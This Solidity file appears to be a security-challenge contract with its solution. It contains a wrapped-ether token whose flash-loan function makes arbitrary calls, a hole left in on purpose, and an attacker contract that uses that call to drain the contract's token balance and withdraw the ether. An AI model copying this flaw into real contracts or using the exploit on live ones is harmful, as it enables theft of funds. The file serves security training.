// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Angel Di Maria Wrapped Ether
contract WETH11 is ERC20("Angel Di Maria Wrapped Ether", "WETH11"), ReentrancyGuard {
  receive() external payable {
    deposit();
  }

  function _burnAll() internal {
    _burn(msg.sender, balanceOf(msg.sender));
  }

  function deposit() public payable nonReentrant {
    _mint(msg.sender, msg.value);
  }

  function withdraw(uint256 wad) external nonReentrant {
    _burn(msg.sender, wad);
    Address.sendValue(payable(msg.sender), wad);
  }

  function withdrawAll() external nonReentrant {
    uint256 balance = balanceOf(msg.sender);
    _burnAll();
    Address.sendValue(payable(msg.sender), balance);
  }

  /// @notice Request a flash loan in ETH
  function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
    uint256 prevBalance = address(this).balance;
    Address.functionCallWithValue(receiver, data, amount);

    require(address(this).balance >= prevBalance, "flash loan not returned");
  }
}

contract WETH11Attacker {
  WETH11 private weth11;
  address immutable target;
  address immutable bob;

  constructor(address targetAddress) payable {
    weth11 = WETH11(payable(targetAddress));
    bob = address(this);
    target = targetAddress;

    // deposit 10 ETH
    weth11.deposit{value: 10 ether}();

    // mistakenly, send the 10 WETH you've just gained
    weth11.transfer(targetAddress, 10 ether);
  }

  function pwn() external {
    // take 0-amount flash loan, approving the entire balance of WETH to Bob
    weth11.execute(
      target,
      0,
      abi.encodeWithSignature("transfer(address,uint256)", [uint256(uint160(bob)), weth11.balanceOf(target)])
    );

    // withdraw
    weth11.withdrawAll();
  }

  receive() external payable {}
}
